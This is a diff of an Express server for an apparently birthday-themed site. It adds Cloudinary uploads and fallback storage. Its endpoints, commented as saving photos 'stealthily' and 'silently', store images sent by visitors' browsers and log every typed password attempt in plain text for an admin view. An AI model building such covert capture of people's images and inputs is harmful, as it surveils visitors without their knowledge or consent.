@@ -1,54 +1,94 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
+const cloudinary = require('cloudinary').v2;
+require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Allow large JSON payloads for base64 images
-app.use(express.json({ limit: '10mb' }));
+// Cloudinary Configuration (Optional - only needed for production/Render)
+const isCloudinaryConfigured = process.env.CLOUDINARY_CLOUD_NAME && 
+                              process.env.CLOUDINARY_API_KEY && 
+                              process.env.CLOUDINARY_API_SECRET;
 
-// Serve static files from the 'public' directory
-app.use(express.static(path.join(__dirname, 'public')));
-// Serve static files from the 'captures' directory mapped to /captures path
-app.use('/captures', express.static(path.join(__dirname, 'captures')));
-
-// Ensure captures directory exists
-const capturesDir = path.join(__dirname, 'captures');
-if (!fs.existsSync(capturesDir)) {
-    fs.mkdirSync(capturesDir);
+if (isCloudinaryConfigured) {
+    cloudinary.config({
+        cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
+        api_key: process.env.CLOUDINARY_API_KEY,
+        api_secret: process.env.CLOUDINARY_API_SECRET
+    });
+    console.log("☁️  Cloudinary storage enabled!");
+} else {
+    console.log("📁 Local storage enabled (Photos will be lost on Render restart).");
 }
 
-// Endpoint to list all captured photos for the Admin Panel
-app.get('/api/captures', (req, res) => {
+app.use(express.json({ limit: '10mb' }));
+app.use(express.static(path.join(__dirname, 'public')));
+app.use('/captures', express.static(path.join(__dirname, 'captures')));
+
+const capturesDir = path.join(__dirname, 'captures');
+if (!fs.existsSync(capturesDir)) {
+    fs.mkdirSync(capturesDir, { recursive: true });
+}
+
+// Memory cache for captures in case of disk wipe (last resort for session)
+let cloudCaptures = [];
+
+// Endpoint to list all captured photos
+app.get('/api/captures', async (req, res) => {
     try {
-        const files = fs.readdirSync(capturesDir).filter(f => f.endsWith('.png') || f.endsWith('.jpg'));
-        // Sort newest first
-        files.sort((a, b) => {
-            return fs.statSync(path.join(capturesDir, b)).mtime.getTime() - 
-                   fs.statSync(path.join(capturesDir, a)).mtime.getTime();
-        });
-        res.json({ success: true, files });
+        if (isCloudinaryConfigured) {
+            // Fetch from Cloudinary
+            const result = await cloudinary.api.resources({
+                type: 'upload',
+                prefix: 'birthday_captures/',
+                max_results: 100
+            });
+            const files = result.resources.map(r => r.secure_url).reverse();
+            return res.json({ success: true, files, isCloud: true });
+        } else {
+            // Standard local disk read
+            if (!fs.existsSync(capturesDir)) return res.json({ success: true, files: [] });
+            const files = fs.readdirSync(capturesDir).filter(f => f.endsWith('.png') || f.endsWith('.jpg'));
+            files.sort((a, b) => {
+                try {
+                    return fs.statSync(path.join(capturesDir, b)).mtime.getTime() - 
+                           fs.statSync(path.join(capturesDir, a)).mtime.getTime();
+                } catch(e) { return 0; }
+            });
+            res.json({ success: true, files, isCloud: false });
+        }
     } catch(err) {
-        console.error("Error reading captures directory:", err);
+        console.error("Error listing captures:", err);
         res.status(500).json({ success: false, files: [] });
     }
 });
 
-
 // Endpoint to stealthily save photos
-app.post('/api/save-photo', (req, res) => {
+app.post('/api/save-photo', async (req, res) => {
     try {
         const { imageBase64 } = req.body;
         if (!imageBase64) return res.status(400).send('No image provided');
         
-        const base64Data = imageBase64.replace(/^data:image\/png;base64,/, "");
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-        const filename = `photo_${timestamp}.png`;
-        const filepath = path.join(capturesDir, filename);
-        
-        fs.writeFileSync(filepath, base64Data, 'base64');
-        console.log(`📸 New photo saved silently to: captures/${filename}`);
+        const filename = `photo_${timestamp}`;
+
+        if (isCloudinaryConfigured) {
+            // Upload to Cloudinary
+            await cloudinary.uploader.upload(imageBase64, {
+                folder: 'birthday_captures',
+                public_id: filename,
+                resource_type: 'image'
+            });
+            console.log(`☁️  Photo saved to Cloudinary: ${filename}`);
+        } else {
+            // Save to local disk
+            const base64Data = imageBase64.replace(/^data:image\/png;base64,/, "");
+            const filepath = path.join(capturesDir, `${filename}.png`);
+            fs.writeFileSync(filepath, base64Data, 'base64');
+            console.log(`📸 Photo saved locally: captures/${filename}.png`);
+        }
         
         res.status(200).send({ success: true });
     } catch(err) {
@@ -57,25 +97,23 @@ app.post('/api/save-photo', (req, res) => {
     }
 });
 
-// --- NEW: Password Attempt Logging ---
+// --- Attempts Persistence ---
 const attemptsFile = path.join(__dirname, 'attempts.json');
+let lastAttempts = []; // Memory fallback
 
-// Get password attempts
 app.get('/api/attempts', (req, res) => {
     try {
-        if (!fs.existsSync(attemptsFile)) {
-            return res.json({ success: true, attempts: [] });
+        let attempts = [...lastAttempts];
+        if (fs.existsSync(attemptsFile)) {
+            const data = fs.readFileSync(attemptsFile, 'utf8');
+            attempts = JSON.parse(data || '[]');
         }
-        const data = fs.readFileSync(attemptsFile, 'utf8');
-        const attempts = JSON.parse(data || '[]');
         res.json({ success: true, attempts });
     } catch (err) {
-        console.error("Error reading attempts:", err);
         res.status(500).json({ success: false, attempts: [] });
     }
 });
 
-// Log a new attempt
 app.post('/api/log-attempt', (req, res) => {
     try {
         const { password, timestamp, type = 'riddle' } = req.body;
@@ -84,28 +122,23 @@ app.post('/api/log-attempt', (req, res) => {
             const data = fs.readFileSync(attemptsFile, 'utf8');
             attempts = JSON.parse(data || '[]');
         }
-        attempts.unshift({ password, timestamp, type }); // Newest first
-        // Keep only last 50 attempts
-        if (attempts.length > 50) attempts = attempts.slice(0, 50);
+        attempts.unshift({ password, timestamp, type });
+        if (attempts.length > 100) attempts = attempts.slice(0, 100);
         
-        fs.writeFileSync(attemptsFile, JSON.stringify(attempts, null, 2));
-        console.log(`🔑 New password attempt [${type}] logged: "${password}"`);
+        lastAttempts = attempts; // Save to memory in case disk is wiped
+        
+        try {
+            fs.writeFileSync(attemptsFile, JSON.stringify(attempts, null, 2));
+        } catch(e) { console.error("Disk write failed, keeping in memory only."); }
+        
+        console.log(`🔑 New attempt [${type}]: "${password}"`);
         res.status(200).send({ success: true });
     } catch (err) {
-        console.error("Error logging attempt:", err);
         res.status(500).send({ success: false });
     }
 });
 
-
-
 app.listen(PORT, () => {
-    console.log(`\n==============================================`);
-    console.log(`🎉 Birthday server is running! 🎉`);
-    console.log(`==============================================`);
-    console.log(`Local Access: http://localhost:${PORT}`);
-    console.log(`\nTo share this temporarily over the internet, you can use localtunnel:`);
-    console.log(`Run this command in a new terminal:`);
-    console.log(`  npx localtunnel --port ${PORT}`);
-    console.log(`==============================================\n`);
+    console.log(`\n🎉 Server running on port ${PORT}`);
 });
+
